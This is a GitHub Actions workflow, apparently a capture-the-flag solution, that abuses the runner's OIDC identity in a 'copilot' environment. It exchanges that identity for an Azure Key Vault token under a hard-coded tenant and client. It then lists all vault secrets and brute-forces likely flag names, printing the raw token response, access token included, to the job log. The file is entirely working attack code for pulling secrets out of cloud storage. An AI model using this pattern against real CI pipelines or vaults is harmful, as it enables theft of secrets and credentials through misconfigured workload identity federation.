name: get-flag
on: [workflow_dispatch]

permissions:
  id-token: write
  contents: read

jobs:
  get-flag:
    runs-on: ubuntu-latest
    environment: copilot
    steps:
      - name: Get flag from Key Vault
        run: |
          TOKEN_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${TOKEN_URL}" | jq -r '.value')

          TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
          CLIENT="72ff278a-9e71-43ec-bac4-2ca303f8e462"

          echo "=== Token exchange response ==="
          RESPONSE=$(curl -s -X POST \
            "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "client_id=${CLIENT}&grant_type=client_credentials&client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=${OIDC_TOKEN}&scope=https%3A%2F%2Fvault.azure.net%2F.default")
          echo "${RESPONSE}" | jq .

          AZ_TOKEN=$(echo "${RESPONSE}" | jq -r '.access_token // empty')
          echo "Token length: ${#AZ_TOKEN}"

          if [ -n "${AZ_TOKEN}" ]; then
            VAULT="https://kv-tbl-sec-x3euoz.vault.azure.net"
            echo "=== List all secrets ==="
            curl -s -H "Authorization: Bearer ${AZ_TOKEN}" "${VAULT}/secrets?api-version=7.4"
            echo ""
            echo "=== Try flag names ==="
            for S in flag ctf-flag df26 df26-flag secret answer DF26 the-flag; do
              echo "--- ${S} ---"
              curl -s -H "Authorization: Bearer ${AZ_TOKEN}" "${VAULT}/secrets/${S}?api-version=7.4"
            done
          fi
